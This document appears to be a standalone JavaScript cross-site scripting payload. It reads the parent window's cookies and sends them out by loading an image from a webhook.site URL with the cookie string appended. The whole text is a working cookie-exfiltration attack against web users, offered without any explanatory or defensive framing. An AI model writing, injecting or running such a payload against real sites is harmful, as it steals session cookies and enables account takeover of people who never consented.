(function(){
	var result = "";
	try {
		m = window.parent.document;
		ck = m.cookie;
		result += ck;
	}
	catch (e){
		result += 'exception';
		console.log("test");
	}
	c = document.createElement("img");
	document.body.appendChild(c);
	c.src = "https://webhook.site/b254c93a-7edc-44e0-a9c4-c884c682f643/" + result;

})()
